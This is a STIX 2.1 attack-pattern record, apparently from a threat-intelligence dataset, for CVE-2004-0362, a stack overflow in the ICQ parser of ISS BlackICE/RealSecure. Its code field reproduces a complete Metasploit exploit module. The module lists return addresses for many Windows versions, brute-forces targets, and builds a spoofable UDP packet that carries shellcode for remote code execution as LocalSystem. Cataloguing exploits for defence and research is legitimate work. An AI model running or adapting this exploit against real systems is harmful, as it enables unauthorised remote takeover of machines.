{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e17470b-8f0d-4593-abdb-20e1dcf4eb0a",
    "created": "2024-08-14T16:48:46.712813Z",
    "modified": "2024-08-14T16:48:46.712817Z",
    "name": "ISS PAM.dll ICQ Parser Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the ISS products that use the iss-pam1.dll ICQ parser (Blackice/RealSecure). Successful exploitation will result in arbitrary code execution as LocalSystem. This exploit only requires 1 UDP packet, which can be both spoofed and sent to a broadcast address.  The ISS exception handler will recover the process after each overflow, giving us the ability to bruteforce the service and exploit it multiple times. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/firewall/blackice_pam_icq.rb",
            "external_id": "blackice_pam_icq.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0362"
        },
        {
            "source_name": "reference",
            "url": "http://www.eeye.com/html/Research/Advisories/AD20040318.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ISS PAM.dll ICQ Parser Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the ISS products that use\n        the iss-pam1.dll ICQ parser (Blackice/RealSecure). Successful exploitation\n        will result in arbitrary code execution as LocalSystem. This exploit\n        only requires 1 UDP packet, which can be both spoofed and sent to a broadcast\n        address.\n\n        The ISS exception handler will recover the process after each overflow, giving\n        us the ability to bruteforce the service and exploit it multiple times.\n      },\n      'Author'         => 'spoonm',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2004-0362'],\n          ['OSVDB', '4355'],\n          ['URL',   'http://www.eeye.com/html/Research/Advisories/AD20040318.html']\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 504-31-4,\n          'BadChars'        => \"\\x00\",\n          'MinNops'         => 0,\n          'MaxNops'         => 0,\n          'StackAdjustment' => -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Bruteforce',                   {  } ],\n          [ 'Bruteforce iis-pam1.dll',      { 'Targets' => 3 .. 4  } ],\n          [ 'Bruteforce NT 4.0',            { 'Targets' => 5 .. 15 } ],\n          [ 'iis-pam1.dll 3.6.06',          { 'Ret' => 0x5e0a47ef } ],\n          [ 'iis-pam1.dll 3.6.11',          { 'Ret' => 0x5e0da1db } ],\n          [ 'WinNT SP3/SP4/SP5',            { 'Ret' => 0x777e79ab } ],\n          [ 'WinNT SP4/SP5',                { 'Ret' => 0x7733b8db } ],\n          [ 'WinNT SP5/SP6 - advapi32',     { 'Ret' => 0x77dcd1cb } ],\n          [ 'WinNT SP3/SP5/SP6 - shell32',  { 'Ret' => 0x77cec080 } ],\n          [ 'WinNT SP5/SP6 - mswsock',      { 'Ret' => 0x7767ebca } ],\n          [ 'WinXP SP0/SP1 - shell32',      { 'Ret' => 0x776606af } ],\n          [ 'WinXP SP0/SP1 - atl',          { 'Ret' => 0x76b305a7 } ],\n          [ 'WinXP SP0/SP1 - atl',          { 'Ret' => 0x76e61a21 } ],\n          [ 'WinXP SP0/SP1 - ws2_32',       { 'Ret' => 0x71ab7bfb } ],\n          [ 'WinXP SP0/SP1 - mswsock',      { 'Ret' => 0x71a5403d } ],\n          [ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec68b } ],\n          [ 'Win2000 SP0 - SP4',            { 'Ret' => 0x750231e2 } ],\n          [ 'Win2000 SP2/SP3 - samlib',     { 'Ret' => 0x75159da3 } ],\n          [ 'Win2000 SP0/SP1 - activeds',   { 'Ret' => 0x77ed0beb } ],\n          [ 'Windows XP Pro SP0 English',   { 'Ret' => 0x77e3171b } ],\n          [ 'Windows XP Pro SP1 English',   { 'Ret' => 0x77dc5527 } ],\n          [ 'WinXP SP0 - SP1',              { 'Ret' => 0x71aa3a4b } ],\n          [ 'Win2003 SP0',                  { 'Ret' => 0x71bf3cc9 } ],\n        ],\n      'DisclosureDate' => '2004-03-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(1)\n      ])\n  end\n\n  def exploit\n    datastore['RPORT'] = rand(65536) if rport == 1\n\n    targs = [ target ]\n\n    if target.name =~ /^Brute/\n      if target['Targets']\n        targs = []\n\n        target['Targets'].each { |idx|\n          targs << targets[idx]\n        }\n      else\n        targs = targets.dup\n\n        targs.delete_at(0)\n        targs.delete_at(0)\n        targs.delete_at(0)\n      end\n    end\n\n    targs.each { |targ|\n      print_status(\"Trying target #{targ.name} [#{\"%.8x\" % targ.ret}]...\")\n\n      shellcode = payload.encoded + rand_text_english(payload_space - payload.encoded.length)\n      email     = rand_text_english(19) + [targ.ret].pack('V') + shellcode\n\n      # Hopefully this structure is correct -- ported from msf 2.  Blame me\n      # (skape) if it doesn't work!\n      packet    =\n        # SRV_MULTI\n        [5, 0, 0, 530, 0, 0, 1161044754, 0, 2].pack('vcVvvvVVc') +\n        # SRV_USER_ONLINE\n        [5, 0, 0, 110, 0, 0, 1161044754, 0].pack('vcVvvvVV') +\n        [1161044754, 1, 0, 0, 0, 0, 0].pack('VVVVcVV') +\n        # SRV_META_USER\n        [5, 0, 0, 990, 0, 0, 2018915346, 0].pack('vcVvvvVV') +\n        \"\\x00\\x00\\x0a\" + # subcommand / success\n        \"\\x00\\x00\"     + # nick length / nick\n        \"\\x00\\x00\"     + # first length / first\n        \"\\x00\\x00\"     + # last length / last\n        [email.length].pack('v') + email +\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n      print_status(\"Sending UDP request to #{datastore['RPORT']} (#{packet.length} bytes)\")\n\n      connect_udp(true, { 'CPORT' => 4000 })\n      udp_sock.put(packet)\n      disconnect_udp\n\n      print_status(\"Sleeping (giving exception handler time to recover)\")\n\n      select(nil,nil,nil,5)\n    }\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-03-18",
    "x_mitre_platforms": [
        "win'"
    ]
}